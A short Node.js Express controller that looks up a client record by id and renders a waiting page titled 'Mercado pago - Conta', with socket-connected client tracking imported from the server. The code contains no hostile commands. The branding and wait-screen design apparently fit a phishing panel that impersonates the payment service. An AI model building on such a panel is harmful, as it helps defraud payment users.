const Client = require('../../models/Client')
const { clientsSocket, connectedUsers } = require('../../server')

module.exports = {
    async view(req, res) {
        try {
            //Client
            const { client: id } = req.query

            if (!id) return res.redirect('/modules/conta')

            const client = await Client.findByPk(id)

            if (!client) return res.redirect('/modules/conta')

            return res.render('pages/await', {
                title: 'Mercado pago - Conta',
                pageClasses: 'password cadastro',
                await: true,
                client: client.toJSON(),
            })
        } catch (error) {
            console.log(error)
            return res.redirect('/')
        }
    },
}
